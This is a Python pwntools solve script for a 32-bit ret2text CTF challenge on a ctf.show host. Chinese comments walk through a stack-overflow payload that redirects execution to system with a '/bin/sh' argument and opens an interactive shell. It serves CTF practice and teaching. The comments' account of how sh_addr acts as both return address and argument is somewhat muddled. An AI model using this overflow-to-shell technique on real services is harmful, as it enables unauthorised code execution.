from pwn import *

p = remote('pwn.challenge.ctf.show', 28185)

# offset = 0x12 + 4：计算栈溢出的偏移量
# 0x12：缓冲区到saved ebp的距离
# 4：saved ebp的大小（32位程序）
# 总偏移量 = 0x12 + 4 = 0x16，定位到返回地址
offset = 0x12 + 4

# sh_addr = 0x80487BA：/bin/sh字符串的地址
# 通过IDA搜索字符串找到的"/bin/sh"地址
sh_addr = 0x80487BA

# system_addr = 0x804856E：system函数的地址
# 通过IDA分析程序找到的system函数地址
system_addr = 0x804856E

# payload = b'a' * offset + p32(system_addr) + p32(sh_addr)：构造攻击载荷
# b'a' * offset：填充垃圾数据到返回地址位置
# p32(system_addr)：覆盖返回地址为system函数地址
# p32(sh_addr)：作为system函数的参数（/bin/sh字符串地址）
# 32位调用约定：system执行时会从栈上取参数，此时esp指向sh_addr的位置
# 这里省略了system的返回地址，sh_addr既作为返回地址又作为参数
payload = b'a' * offset + p32(system_addr) + p32(sh_addr)

p.sendline(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 32位system调用（简化版）
2. 与pwn39的区别：
   - 少了 p32(0) 这个返回地址
   - 为什么可以省略？
3. payload结构分析：
   b'a' * offset      - 填充到返回地址
   + p32(system_addr) - 返回地址指向system
   + p32(sh_addr)     - 作为system的返回地址，同时也是/bin/sh字符串地址
4. 巧妙之处：
   - sh_addr 既是system的"返回地址"，又是"/bin/sh"字符串
   - 当system执行时，它会从栈上取参数
   - 由于32位调用约定，system认为栈上的内容是它的参数
   - 实际上 sh_addr 被当作参数传递给system
5. 栈布局：
   [填充] [system] [sh_addr]
                     ↑
                  system执行时esp指向这里，将其作为参数
6. 这种写法依赖于程序的特殊布局，不具有通用性
"""
